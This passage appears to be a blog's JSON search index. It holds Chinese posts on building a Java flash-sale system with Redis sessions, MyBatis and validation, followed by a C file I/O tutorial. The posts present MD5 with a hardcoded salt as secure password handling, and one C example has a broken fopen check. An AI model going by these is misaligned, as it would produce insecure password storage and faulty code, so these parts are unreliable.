(user_id,goods_id,goods_name,goods_count,goods_price,order_channel,status,create_date)\" + \"values(#&#123;userId&#125;,#&#123;goodsId&#125;,#&#123;goodsName&#125;,#&#123;goodsCount&#125;,#&#123;goodsPrice&#125;,#&#123;orderChannel&#125;,#&#123;status&#125;,#&#123;createDate&#125;)\" ) @SelectKey(statement = \"select last_insert_id()\",keyProperty = \"id\",resultType = long.class,before = false) long insert(OrderInfo orderInfo);1234 3.3 @SelectKey()注解 需要前置注解：@Insert 或 @InsertProvider 或 @Update 或 @UpdateProvider，否则无效。 statement：填入将会被执行的 SQL 字符串 keyProperty属性：填入将会被更新的参数对象的属性 before属性：填入 true 或 false 以指明 SQL 语句应被在插入语句的之前还是之后执行 resultType属性：填入 keyProperty 的 Java 类型 3.3.1 获取主键值的注意事项可能我们在执行完插入方法后，想如下这样通过获取返回值的方法来获取主键id值 12long orderId = orderDao.insert(orderInfo)1 然而并不是这样，因为执行插入sql语句返回值只有两种情况，一种是插入成功返回1，另一种是插入失败，返回0，所以若这里出现一直获取到1值的问题，用如下方法解决 12orderInfo.getId();1 因为，@SelectKey()会将值直接映射到实体类的属性上进行修改，要想获取主键值，只能这样获取，不能通过返回值获取","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"Java高性能高并发秒杀系统(3)","slug":"Java高性能高并发秒杀系统 - 副本 (2)","date":"2020-11-07T04:12:45.000Z","updated":"2021-04-15T15:25:56.661Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system-3/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system-3/","excerpt":"","text":"1. 实现分布式Session1.1 原理图解 作用：用Redis存储Session值，在Redis中通过token值来获取用户信息 1.2 每次登陆，将Session的过期时间进行修正 怎么说呢？我们的Session值固定过期时间为30min，要在每次登陆的时候，以当前时间继续顺延30分钟 我们的解决方法就是，每次登陆时，重新再添加一次Cookie，则能够完成时间延长 以下是封装addCookie()的方法 12345678910 private void addCookie(HttpServletResponse response, MiaoShaUser user, String token) &#123; //首次登陆的时候，需要将Cookie存入Redis redisService.set(MiaoShaUserKey.getTokenPrefix,token,user); Cookie cookie = new Cookie(COOKIE_NAME_TOKEN, token); cookie.setMaxAge(MiaoShaUserKey.getTokenPrefix.expireSeconds()); //设置为根目录，则可以在整个应用范围内使用cookie cookie.setPath(\"/\"); response.addCookie(cookie); &#125;123456789 1.3 Cookie有什么用？在我们这个项目中，Cookie中存储的是token值。而这个token值是和用户信息是一一绑定的，将会存储在Redis中。我们从Cookie中获取到token，从而就可以获取到用户，下面简化代码的过程，便是对这一过程的演示。 1.4 分布式Session的理解服务器中的原生session是无法满足需求的，因为用户的请求有可能随机落入到不同的服务器中，这样的结果将会导致用户的session丢失，传统做法中有解决方案，是进行session同步，将一个服务器上的session进行同步到另一个服务器上，在一个集群中无论你访问哪个服务器都可以共享，但是这种方法有个明显缺陷，就是性能问题，传输有时延问题，其次这样每台服务器的session重复拥有，这样其内存必然受到影响，如果只有几台服务器还好，如果是十台，二十台服务器呢？这种恐怖的场景会是什么样的体验呢，我就无法得知了。 那么我们应该如何有效的解决这样的问题呢，我们可以使用传说中的token来解决，简单明了的说就是用户每次登陆的时候生成一个类似sessionId的东西（也就是所谓的token，这将是全局的唯一标识，如UUID，作用类似于（sessionId）），将其写到cookie当中传送给客户端，客户端对数据库访问过程中不断上传这个token，而我们服务端拿到这个token就可以获取用户的信息，这个道理其实在很多地方是相通的，比如我们容器中实现原生session，也是将生成的id写入cookie当中。 2. 解决注解获取参数造成的代码冗余我们看一下，如下代码 12345678910111213141516 @RequestMapping(\"/to_list\") public String toList(Model model, @CookieValue(value = MiaoShaUserService.COOKIE_NAME_TOKEN,required = false) String cookieToken, @RequestParam(value = MiaoShaUserService.COOKIE_NAME_TOKEN,required = false) String paramToken, )&#123; if(StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(paramToken))&#123; return \"login\"; &#125; String token = StringUtils.isEmpty(paramToken) ? cookieToken : paramToken; MiaoShaUser user = miaoShaUserService.getByToken(response,token); model.addAttribute(\"user\",user); return \"goods_list\"; &#125;123456789101112131415 @CookieValue：这个注解能够根据参数value在Cookie中获取值 @RequestParam：该注解让我们在Request中能获取参数，解决的主要是，移动手机端不使用Cookie存值的问题 我们在如上代码中，可以发现，注解标记获取参数，使得代码很厚重，若我们每次想从Cookie中获取token值时，都需要复现如上代码，所以我们要把它剖离出来 2.1 WebMvcConfigurerAdapter在这个项目中，我们采用的是继承WebMvcConfigurerAdapter，重写其中addArgumentResolvers()方法，该方法实现的是参数解析的功能 12345678910111213@Configurationpublic class WebConfig extends WebMvcConfigurerAdapter&#123; @Autowired UserArgumentResolver userArgumentResolver; @Override public void addArgumentResolvers(List&lt;HandlerMethodArgumentResolver&gt; argumentResolvers) &#123; super.addArgumentResolvers(argumentResolvers); argumentResolvers.add(userArgumentResolver); &#125;&#125;123456789101112 2.1.1 该方法在Spring5.0之后就过时了 现用方式 实现WebMvcConfigurer 12345@Configurationpublic class WebMvcConfg implements WebMvcConfigurer &#123; //TODO&#125;1234 继承WebMVCConfigurationSupport 12345@Configurationpublic class WebMvcConfg extends WebMvcConfigurationSupport &#123; //TODO&#125;1234 2.2 在argumentResolvers中添加我们的参数解析逻辑 首先，我们应该搞清楚，我们想要的参数是什么？回看代码冗余的问题，最终我们想获取的是MiaoShaUser，这下我们进行代码的编写 1234567891011121314151617181920212223242526272829303132333435363738394041@Servicepublic class UserArgumentResolver implements HandlerMethodArgumentResolver &#123; @Autowired MiaoShaUserService miaoShaUserService; @Override public boolean supportsParameter(MethodParameter methodParameter) &#123; //这个方法判断参数类型是否支持 Class&lt;?&gt; clazz = methodParameter.getParameterType(); return clazz == MiaoShaUser.class; &#125; @Override public Object resolveArgument(MethodParameter methodParameter, ModelAndViewContainer modelAndViewContainer, NativeWebRequest nativeWebRequest, WebDataBinderFactory webDataBinderFactory) throws Exception &#123; //这个方法实现对参数的处理 HttpServletRequest request = nativeWebRequest.getNativeRequest(HttpServletRequest.class); HttpServletResponse response = nativeWebRequest.getNativeResponse(HttpServletResponse.class); String paramToken = request.getParameter(miaoShaUserService.COOKIE_NAME_TOKEN); String cookieToken = getCookieValue(request, miaoShaUserService.COOKIE_NAME_TOKEN); if(StringUtils.isEmpty(paramToken) &amp;&amp; StringUtils.isEmpty(cookieToken))&#123; return null; &#125; String token = StringUtils.isEmpty(paramToken) ? cookieToken : paramToken; return miaoShaUserService.getByToken(response,token); &#125; private String getCookieValue(HttpServletRequest request,String cookieName)&#123; Cookie[] cookies = request.getCookies(); for(Cookie cookie : cookies)&#123; if(cookie.getName().equals(cookieName))&#123; return cookie.getValue(); &#125; &#125; return null; &#125;&#125; 实现HandlerMethodArgumentResolver接口，必须重写其中的两个方法，supportsParameter()和resolveArgument() 前者是对我们要进行解析的参数类型进行判断，符合才执行后者 后者是我们对参数的处理逻辑，两种情况，一是从request中获取token值，二是从cookie中拿取token值，根据token值来获取到对应的user 以上就将我们需要的参数的处理逻辑实现了，在Mvc配置中，用argumentResolvers.add(userArgumentResolver)方法进行添加即可，这样我们再想获取user的时候就简单多了，如下 2.3 如此清爽的代码123456 @RequestMapping(\"/to_list\") public String toList(Model model,MiaoShaUser user)&#123; model.addAttribute(\"user\",user); return \"goods_list\"; &#125;12345 省去了@CookieValue和@RequestParam注解的冗余，而且我们对user的获取也方便多了","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"Java高性能高并发秒杀系统(2)","slug":"Java高性能高并发秒杀系统 - 副本","date":"2020-11-06T04:13:45.000Z","updated":"2021-04-15T15:25:31.860Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system-2/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system-2/","excerpt":"","text":"1. 登录过程中，密码两次MD5加密1.1 为啥用两次MD5哇？ 第一次MD5，是针对传输安全做的MD5加密，因为http是明文传递，如果不进行加密的话，密码就直接被劫持了。(Password1 = MD5(inputPassword,固定的salt值)，salt为字符串) 第二次MD5，是针对数据库安全做的MD5加密，保证数据库的防盗安全。若不进行二次加密，MD5值经数据库获取，可直接被MD5转换器直接转换为用户密码，不安全。(Password2 = MD5(Password1,随机的salt值)) 2. 构建数据库表 2.1 几个需要注意的点 字符集采用的是utf8mb4(most bytes 4)。简单来说，utf8mb4是utf8的超集，能够用4个字节存储更多的字符。标准UTF-8字符集编码可以用1~4个字节取编码21位字符，但是在MySQL中，utf8最多使用3个字节，像一些表情emoji和不常用的字符如“墅”需要用4个字节才能表示出来。用utf8mb4能解决以上问题。 数据库中存储了&quot;动态&quot;salt值 3. 针对MD5加密功能，封装了专用工具类以下MD5包的Maven依赖了解以下 12345678910 &lt;dependency&gt; &lt;groupId&gt;commons-codec&lt;/groupId&gt; &lt;artifactId&gt;commons-codec&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt; &lt;version&gt;3.6&lt;/version&gt; &lt;/dependency&gt;123456789 3.1 工具类代码12345678910111213141516171819202122232425public class MD5Util &#123; //静态的salt，用于第一次MD5 private static final String salt = \"1a2b3c4d\"; private static String md5(String src)&#123; //调用DigestUtils，实现md5处理 return DigestUtils.md5Hex(src); &#125; /** * 第一次MD5处理 * @param inputPass * @return */ public static String inputPassToFormPass(String inputPass)&#123; //这里没加“”出现了问题？？？ String pass =\"\" + salt.charAt(1) + salt.charAt(7) + inputPass + salt.charAt(3) + salt.charAt(5); //System.out.println(pass); return md5(pass); &#125; ...&#125;123456789101112131415161718192021222324 我在第一次处理加密时，拼接字符时没有添加&quot;&quot;，出现了登录验证失败的问题 4. 加入JSR参数校验4.1 JSR参数校验 我们看如下，代码，在登录处理过程中，我们要用代码实现对前端传过来的id和password进行校验（我们这里是验证非空），引入JSR参数校验之后，能够将这些代码省去 1234567891011121314151617181920212223 @PostMapping(\"/do_login\") @ResponseBody public Result&lt;Boolean&gt; doLogin(LoginVo loginVo)&#123; log.info(loginVo.toString()); //参数校验 String mobile = loginVo.getMobile(); String password = loginVo.getPassword(); if(StringUtils.isEmpty(password))&#123; return Result.error(CodeMsg.PASSWORD_EMPTY); &#125; if(! ValidatorUtil.isMobile(mobile))&#123; return Result.error(CodeMsg.MOBILE_ERROR); &#125; CodeMsg msg = miaoShaUserService.login(loginVo); if(msg.getCode() == 0)&#123; return Result.success(true); &#125;else &#123; return Result.error(msg); &#125; &#125;12345678910111213141516171819202122 进行JSR参数校验升级 我们先看一下导入的包 12345 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt; &lt;/dependency&gt;1234 我们在doLogin()方法上，加上JSR验证，@Valid注解 12public Result&lt;CodeMsg&gt; doLogin(@Valid LoginVo loginVo)1 被标注的参数，我们进入它的实现类中，对其中的字段进行约束，如下（@NotNull，@Length，@IsMobile，其中@IsMobile是我们自定义的注解） 123456789101112@Datapublic class LoginVo &#123; @IsMobile @NotNull private String mobile; @NotNull @Length(min = 32) private String password;&#125;1234567891011 4.2 @IsMobile自定义注解我们看一下它的代码（这个注解的写法，根据已有注解@NotNull，仿写而来），它实现的是对手机号码的验证 12345678910111213141516171819@Target(&#123;ElementType.FIELD, ElementType.ANNOTATION_TYPE, ElementType.CONSTRUCTOR, ElementType.PARAMETER&#125;)@Retention(RetentionPolicy.RUNTIME)@Documented@Constraint( validatedBy = &#123;IsMobileValidator.class&#125;)public @interface IsMobile &#123; boolean required() default true; //以下三条语句，足矣 //我们在其中添加错误信息 String message() default \"手机号码格式错误\"; Class&lt;?&gt;[] groups() default &#123;&#125;; Class&lt;? extends Payload&gt;[] payload() default &#123;&#125;;&#125;123456789101112131415161718 @Target：表示的是能够标注的范围 @Constraint：这个注解帮助我们处理逻辑，其中有IsMobileValidator.class是真正处理逻辑的类，我们看看它的代码 123456789101112131415161718192021222324252627public class IsMobileValidator implements ConstraintValidator&lt;IsMobile, String&gt; &#123; private boolean required = false; @Override public boolean isValid(String s, ConstraintValidatorContext constraintValidatorContext) &#123; if(required)&#123; //在必须有值的情况下 return ValidatorUtil.isMobile(s); &#125;else &#123; //在不要求有值的情况下 if(StringUtils.isEmpty(s))&#123; //空值是允许的 return true; &#125;else &#123; //有值就给它判断判断 return ValidatorUtil.isMobile(s); &#125; &#125; &#125; @Override public void initialize(IsMobile constraintAnnotation) &#123; required = constraintAnnotation.required(); &#125;&#125;1234567891011121314151617181920212223242526 先看类的声明部分，public class IsMobileValidator implements ConstraintValidator，它有两个泛型，第一个是自定义的注解类，第二个是要验证的参数类型，另外实现该接口的逻辑类，被spring管理成bean，可以在需要的地方进行装配 其中有一个initialize，初始化方法，它调用的是我们自定义注解中写的required()方法，默认需要有值 另一个方法isValid，则对逻辑进行验证，true验证通过，false验证失败 5. 全局异常处理器5.1 我们为什么要引入全局异常处理器？ 一边想，一边看一下下面这个方法 123456789101112131415161718192021222324 public CodeMsg login(LoginVo loginVo)&#123; if(loginVo == null)&#123; return CodeMsg.SERVER_ERROR; &#125; String mobile = loginVo.getMobile(); String password = loginVo.getPassword(); //判断手机号是否存在 MiaoShaUser user = getById(Long.parseLong(mobile)); if(user == null)&#123; return CodeMsg.MOBILE_NOT_EXIST; &#125; //验证密码 String DBPass = user.getPassword(); //这里对前端来的密码第二次MD5处理 String formPassToDBPass = MD5Util.formPassToDBPass(password, user.getSalt()); if(!formPassToDBPass.equals(DBPass))&#123; return CodeMsg.PASSWORD_ERROR; &#125; return CodeMsg.SUCCESS; &#125;1234567891011121314151617181920212223 它的返回值是CodeMsg，而在业务中，方法对应的返回值应该是确切的，我们登陆，返回应该为 true 或 false，所以，我们要对这里进行优化 5.2 优化代码如下 123456789101112131415161718192021222324 public boolean login(LoginVo loginVo)&#123; if(loginVo == null)&#123; throw new GlobalException(CodeMsg.SERVER_ERROR); &#125; String mobile = loginVo.getMobile(); String password = loginVo.getPassword(); //判断手机号是否存在 MiaoShaUser user = getById(Long.parseLong(mobile)); if(user == null)&#123; throw new GlobalException(CodeMsg.MOBILE_NOT_EXIST); &#125; //验证密码 String DBPass = user.getPassword(); //这里对前端来的密码第二次MD5处理 String formPassToDBPass = MD5Util.formPassToDBPass(password, user.getSalt()); if(!formPassToDBPass.equals(DBPass))&#123; throw new GlobalException(CodeMsg.PASSWORD_ERROR); &#125; return true; &#125;1234567891011121314151617181920212223 我们可以发现，对应的参数验证，并没有返回值，而是直接抛出异常，而且我们也将返回值进行了修改，执行到方法的最后，能够返回ture 5.3 全局异常123456789101112public class GlobalException extends RuntimeException &#123; private CodeMsg codeMsg; public GlobalException(CodeMsg codeMsg)&#123; this.codeMsg = codeMsg; &#125; public CodeMsg getCodeMsg() &#123; return codeMsg; &#125;&#125;1234567891011 全局异常就比较简单了，它继承了RuntimeException类，其中包含我们需要返回的信息CodeMsg的字段 5.4 全局异常处理器这个处理器可就值得说一说了！ 1234567891011121314151617181920212223242526@ControllerAdvice@ResponseBodypublic class GlobalExceptionHandler &#123; @ExceptionHandler(value = Exception.class) public Result&lt;String&gt; exceptionHandler(HttpServletRequest request,Exception e)&#123; if(e instanceof GlobalException)&#123; GlobalException ge = (GlobalException) e; CodeMsg codeMsg = ge.getCodeMsg(); return Result.error(codeMsg); &#125; else if(e instanceof BindException)&#123; //获取错误列表，拿取其中的第一个 BindException be = (BindException) e; List&lt;ObjectError&gt; allErrors = be.getAllErrors(); ObjectError error = allErrors.get(0); String message = error.getDefaultMessage(); return Result.error(CodeMsg.BIND_ERROR.fillArgs(message)); &#125;else &#123; return Result.error(CodeMsg.SERVER_ERROR); &#125; &#125;&#125;12345678910111213141516171819202122232425 @ControllerAdvice：它是增强的Controller，能够实现全局异常处理和全局数据绑定 配合@ExceptionHandler(value = Exception.class)，它能够实现对所有异常的接受，而在方法中，对不同的异常进行处理 6. 关注一下参数替换的方法12345678 public static CodeMsg BIND_ERROR = new CodeMsg(500101,\"参数校验异常：%s\"); public CodeMsg fillArgs(Object... args)&#123; int code = this.code; String message = String.format(this.msg, args); return new CodeMsg(code,message); &#125;1234567 其中String.format()能够根据传入的字符串格式，比如”参数校验异常：%s”，其中%s，能被第二个传入的参数进行替换，从而形成动态的字符串","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"Java高性能高并发秒杀系统","slug":"Java高性能高并发秒杀系统","date":"2020-11-06T04:12:45.000Z","updated":"2021-04-15T15:25:25.124Z","comments":true,"path":"Java-high-performance-and-high-concurrency-spike-system/","link":"","permalink":"https://kayleh.top/Java-high-performance-and-high-concurrency-spike-system/","excerpt":"","text":"@CSDN方 圆1. 集成Mybatis 我觉得在集成Mybatis时问题并不大 1.1 新接触的不用xml文件写Mapper文件12345678910@Mapper@Componentpublic interface UserMapper &#123; @Select(\"select * from user where id = #&#123;id&#125;\") User selectById(@Param(\"id\") int id); @Insert(\"insert into user (id,name) values (#&#123;id&#125;,#&#123;name&#125;)\") int insertUser(User user);&#125; 注解@Mapper，标记该类是一个Mapper 通常之前做练习写数据库的CRUD都是在xml文件中进行的，这次采用的是在对应的方法上标注注解的形式，@Select @Insert 1.2 事务的测试123456789101112131415@Servicepublic class UserService &#123; ... @Transactional public boolean tx()&#123; User user1 = new User(2,\"222\"); userMapper.insertUser(user1); User user2 = new User(3,\"333\"); userMapper.insertUser(user2); return true; &#125;&#125; 在UserService中，创建了一个方法，用来测试事务，用@Transactional标记 1.3 自定义一个Result类，用于返回结果使用12345678910111213141516171819202122232425262728293031323334353637@Datapublic class Result&lt;T&gt; &#123; private int code; private String msg; private T data; /** * 成功时调用 */ public static &lt;T&gt; Result&lt;T&gt; success(T data)&#123; return new Result&lt;T&gt;(data); &#125; /** * 失败时调用 */ public static &lt;T&gt; Result&lt;T&gt; error(T data)&#123; return new Result&lt;T&gt;(data); &#125; private Result(T data)&#123; this.data = data; &#125; private Result(int code,String msg)&#123; this.code = code; this.msg = msg; &#125; private Result(CodeMsg codeMsg)&#123; if(codeMsg != null)&#123; msg = codeMsg.getMsg(); code = codeMsg.getCode(); &#125; &#125;&#125; 它包含了三个字段，code用来保存状态码，msg状态信息，data是返回的对象（泛型） 1public class Result&lt;T&gt; 看类声明的语句，其中使用了泛型，这表示返回对象时，我们对其类型是“已知”的，不必强转，增加了灵活性 1234public static &lt;T&gt; Result&lt;T&gt; success(T data)&#123; return new Result&lt;T&gt;(data);&#125;123 其中的方法语句，在返回值中标记了泛型，需要我们在函数定义的中在返回值前加上标识泛型，可以把它想象成正常的返回值，像String等等，只不过用T来表示罢了 不过，在调用这个方法的时候用两种方法 直接调用 Result.success(&quot;Success&quot;); 标记泛型调用，Result.success(&quot;Success&quot;); 两种使用方法的结果都是一样的，不过第二种更能突出它是泛型方法的使用，推荐。 1234private Result(T data)&#123; this.data = data;&#125;123 最后这个实在简单，在构造方法参数中使用泛型，传什么类型就自动为什么类型。 最后总结一下这个Result的功能1.在成功和失败的时候用于结果返回表示2.另外它引入CodeMsg类，在CodeMsg类中，我们自定义了一些状态码和状态信息，用起来也比较方便 下面是CodeMsg类的代码 123456789101112@Data@AllArgsConstructor@NoArgsConstructorpublic class CodeMsg &#123; private int code; private String msg; //通用错误码 public static CodeMsg SUCCESS = new CodeMsg(0,\"success\"); ...&#125; Java泛型详解：和Class的使用。泛型类，泛型方法的详细使用实例 2. 集成Redis2.1 与服务器的Redis建立连接我们的最终目的是要创建出JedisPool，用来创建出Jedis与服务器中Redis进行交互 首先，需要在配置文件application.properties中写好配置信息，比如主机地址、端口号、最大连接数等等 1234567redis.host=182.xxx.xxx.xxxredis.port=6379redis.timeout=3redis.poolMaxTotal=10redis.poolMaxIdle=10redis.poolMaxWait=3123456 写好配置文件，我们要对其进行读取，创建读取配置信息的配置类 12345678910111213@Data@Component//读取配置文件的注解,指定前缀，读以redis打头的@ConfigurationProperties(prefix = \"redis\")public class RedisConfig &#123; private String host; private int port; private int timeout; private int poolMaxTotal; private int poolMaxIdle; private int poolMaxWait;&#125;123456789101112 注意注解@ConfigurationProperties(prefix = &quot;redis&quot;)，用来读取前缀是redis的配置信息，字段与要读取的信息一致 接下来就是要创建JedisPool 1234567891011121314151617@Servicepublic class JedisPoolFactory &#123; @Autowired RedisConfig redisConfig; @Bean public JedisPool jedisPool()&#123; JedisPoolConfig jedisPoolConfig = new JedisPoolConfig(); jedisPoolConfig.setMaxIdle(redisConfig.getPoolMaxIdle()); jedisPoolConfig.setMaxTotal(redisConfig.getPoolMaxTotal()); jedisPoolConfig.setEvictorShutdownTimeoutMillis(redisConfig.getTimeout() * 1000); return new JedisPool(jedisPoolConfig, redisConfig.getHost(),redisConfig.getPort(),redisConfig.getTimeout() * 1000); &#125;&#125;12345678910111213141516 RedisConfig，作为Bean自动装配进来，我们还要建立JedisPoolConfig来设置一些参数，供建立JedisPool时读取 以上，完成了与服务器Redis的建立连接过程 2.2 Key前缀的必要毕竟我们这个是高并发的项目，那么多个人在对同一个key进行读取时，如果不对key值进行修饰，很容易发生数据损坏，所以，我们采用了前缀修饰，在设计模式中，是对模板方法模式的应用 先创建一个接口，其中有两个方法，获得失效时间和获取前缀 1234567public interface KeyPrefix &#123; //添加失效时间 int expireSeconds(); //获取前缀 String getPrefix();&#125;123456 随后，我们创建的是抽象类，它就像是一个模板，为其他实现该抽象类的子类，建立了一个模板（我在说什么？？？应该传达清楚了）我们对接口中的方法进行全部重写，其中获取前缀时，前缀为类名，提供两种构造函数，一种为无失效时间的，另一种为有失效时间的 抽象类中构造方法的理解：其中的构造方法与普通类中的构造方法长得一样，不过它不能用来构造自己，因为它是抽象的，不能实例化，但是一旦子类实现了该抽象类，那么子类便可以调用其抽象类的构造函数进行实例化 1234567891011121314151617181920212223242526public abstract class BasePrefix implements KeyPrefix&#123; private int expireSecond; private String prefix; public BasePrefix(String prefix)&#123; this(0,prefix); &#125; public BasePrefix(int expireSecond,String prefix)&#123; this.expireSecond = expireSecond; this.prefix = prefix; &#125; @Override public int expireSeconds()&#123; return expireSecond; &#125; @Override public String getPrefix() &#123; //获取前缀，前面添加类名 return getClass().getSimpleName() + \":\" + prefix; &#125;&#125;12345678910111213141516171819202122232425 最后，展现出抽象类的实现类 1234567891011public class UserKey extends BasePrefix &#123; public UserKey(String prefix) &#123; super(prefix); &#125; //UserKey的两种前缀形式，一种是根据id另一种根据name public static UserKey getById = new UserKey(\"id\"); public static UserKey getByName = new UserKey(\"name\");&#125;12345678910 它的构造函数就是用的抽象父类中的构造函数，而且定义了两个静态字段，一种是根据Id来生成前缀，前缀格式会根据getPrefix()方法，表示为类名+：+id 2.3 简单看RedisService中的一个方法123456789101112131415161718192021222324252627282930313233@Servicepublic class RedisService &#123; @Autowired JedisPool jedisPool; public &lt;T&gt; boolean set(KeyPrefix keyPrefix,String key,T value)&#123; //获取Jedis对象 Jedis jedis = null; try &#123; jedis = jedisPool.getResource(); String str = beanToString(value); if(str == null || str.length() &lt;= 0)&#123; return false; &#125; String realKey = keyPrefix.getPrefix() + key; int seconds = keyPrefix.expireSeconds(); if(seconds &lt;= 0)&#123; jedis.set(realKey,str); &#125;else&#123; //设置超时时间 jedis.setex(realKey,seconds,str); &#125; return true; &#125;finally &#123; returnToPool(jedis); &#125; &#125; ...&#125;1234567891011121314151617181920212223242526272829303132 根据自动装配获取JedisPool，用Jedis连接池来拿出Jedis与Redis服务器建立连接。 set方法，我们需要将value值转换为String类型，让Redis能够识别 随后，为key添加前缀，生成realKey；获取其中的失效时间 根据失效时间来判断是否需要调用setex()方法 2.4 beanToString与stringToBean方法123456789101112131415161718192021222324252627282930313233343536 private &lt;T&gt; String beanToString(T value)&#123; if(value == null)&#123; return null; &#125; //进行类型判断，这里用到了？通配符 Class&lt;?&gt; clazz = value.getClass(); if(clazz == int.class || clazz == Integer.class)&#123; return \"\" + value; &#125;else if(clazz == long.class || clazz == Long.class)&#123; return \"\" + value; &#125;else if(clazz == String.class)&#123; return (String)value; &#125;else&#123; //如果是对象的话，用JSON的静态方法转String return JSON.toJSONString(value); &#125; &#125;1234567891011121314151617 @SuppressWarnings(\"unchecked\") private &lt;T&gt; T stringToBean(String str,Class&lt;T&gt; clazz)&#123; if(str == null || str.length() &lt;= 0 || clazz == null)&#123; return null; &#125; if(clazz == int.class || clazz == Integer.class)&#123; return (T) Integer.valueOf(str); &#125;else if(clazz == long.class || clazz == Long.class)&#123; return (T) Long.valueOf(str); &#125;else if(clazz == String.class)&#123; return (T) str; &#125;else&#123; //转化成对象的JSON静态方法 return JSON.toJavaObject(JSON.parseObject(str),clazz); &#125; &#125;1234567891011121314151617 注解@SupressWarings(&quot;unchecked&quot;)，镇压警告","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"}]},{"title":"file input and output","slug":"10.file-input-and-output","date":"2020-11-03T10:24:07.000Z","updated":"2021-04-11T17:11:28.066Z","comments":true,"path":"file-input-and-output/","link":"","permalink":"https://kayleh.top/file-input-and-output/","excerpt":"","text":"对文件的输入输出文件 程序文件。包括源程序文件，这种文件的内容是程序代码 数据文件。供程序运行时读写的数据 操作系统把各种设备都统一作为文件来处理。 文件一般指存储在外部介质上数据的集合。 流(数据流)数据的输入输出.流表示了信息从源到目的地的流动. 文件名文件路径+文件名主干+文件后缀 文件的分类 ASCII文件,在存储前需要转换,文本文件 二进制文件,存储在内存的数据的映象,不需要加以转换输出到外存,称为映像文件. 文件缓冲区 ANSI C标准采用“缓冲文件系统”处理数据文件。 所谓缓冲文件系统是指系统自动地在内存区为程序中每一个正在使用的文件开辟一个文件缓冲区从内存向磁盘输出数据必须先送到内存中的缓冲区，装满缓冲区后才一起送到磁盘去。 如果从磁盘向计算机读入数据，则一次从磁盘文件将一批数据输入到内存缓冲区(充满缓冲区)，然后再从缓冲区逐个地将数据送到程序数据区(给程序变量) 。 程序与磁盘之间交互，不是立即完成，系统或程序可根据需要设置缓冲区，以提高存取效率 文件类型指针对于操作系统而言,关键的概念是”文件指针”.每个被使用的文件都在内存中开辟一段存储单元,用来存放文件的有关信息.这些信息是保存在一个结构体变量中的.该结构体类型变量是由系统定义的,取名为FILE.有几个文件就建立几个这样的结构体变量,分别存放各文件的有关信息.同时返回对应的FILE结构指针. FILE结构体类型在stdio.h文件中定义如下: 123456789101112Typedef struct&#123; short level; //缓冲区”满”或”空”的程度// unsigned flags; //文件状态标志// char fd; //文件描述符// unsigned char hold; //如无缓冲区不读取字符// short bsize; //缓冲区大小// unsigned char *buffer; //数据缓冲区的位置// unsigned char *curp; //指针,当前指向// unsigned istemp; //临时文件,指示器// short token; //用于有效性检查//&#125;FILE; 定义一个指向文件型数据的指针变量 1FILE *fp; 可以使fp指向某一个文件的文件信息区(是一个结构体变量),通过该文件信息区中的信息就能够访问该文件. 通过文件指针变量能够找到与它关联的文件,如果有n个文件,应设n个指针变量,分别指向n个FILE类型变量,以实现对n个文件的访问. 通常将这种指向文件信息区的指针变量简称为指向文件的指针变量 并不是指向外部介质上的数据文件的开头,而是指向内存中的文件信息区的开头. 打开与关闭文件“打开”指为文件建立相应的信息区(用来存放有关文件的信息)和文件缓存区(用来暂时存放输入输出的数据). 打开文件的同时,一般指定一个指针变量指向该文件,建立起指针变量与文件之间的联系. 用fopen函数打开数据文件fopen(文件名,使用文件方式) 12FILE *fp;fp=fopen(\"a1\",\"r\"); 实现失败返回NULL. 使用文件方式. 打开方式 含义 指定文件不存在时 指定文件存在时 r 只读方式打开文本文件 出错 正常打开 w 只写方式打开文本文件 建立新文件 文件原有内容丢失 a 追加方式打开文本文件 建立新文件 在原有内容末尾追加 r+ 读/写方式打开文本文件 出错 正常打开 w+ 读/写方式创建新的文本文件 建立新文件 文件原有内容丢失 a+ 读/追加方式建立新的文本文件 建立新文件 在原有内容末尾追加 rb 只读方式打开二进制文件 出错 正常打开 wb 只写方式打开二进制文件 建立新文件 文件原有内容丢失 ab 追加方式打开二进制文件 建立新文件 在原有内容末尾添加 rb+ 读/写方式打开二进制文件 出错 正常打开 wb+ 读/写方式创建新的二进制文件 建立新文件 文件原有内容丢失 ab+ 读/追加方式创建新的二进制文件 建立新文件 在原有内容末尾追加 带b区别在于换行的处理 用fclose函数关闭数据文件fclose(文件指针); 1fclose(fp); 先把缓冲区中的数据输出到磁盘文件,然后才撤销文件信息区. 顺序读写数据文件怎样向文件读写字符读写一个字符的函数. 函数名 调用形式 功能 返回值 fgetc fgetc(fp) 从fp指向的文件读入一个字符 读成功,带回所读的字符,失败了则返回文件结束标志EOF(即-1) fputc fputc(ch,fp) 把字符ch写到文件指针变量fp所指向的文件中 输出成功,返回值就是输出的字符,输出失败,则返回文件结束标志EOF(即-1) 从键盘输入一些字符,并逐个把它们送到磁盘上去,直到用户输入一个”#”为止.1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; FILE *fp; char ch, filename[10]; printf(\"请输入所用的文件名:\"); scanf(\"%s\", filename); getchar();//用来消化最后输入的回车符 if ((fp = fopen(filename, 'w') == NULL)) &#123; printf(\"cannot open file\\n\"); exit(0);//终止程序 &#125; printf(\"请输入一个准备存储到磁盘的字符串(以#结束):\"); ch = getchar(); while (ch != '#') &#123; fputc(ch, fp); putchar(ch); ch = getchar(); //再接收从键盘输入的一个字符 &#125; fclose(fp); putchar(10); //向屏幕输出一个换行符s return 0;&#125; 将一个磁盘文件中的信息复制到另一个磁盘文件中12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; FILE *in, *out; char ch, infile[10], 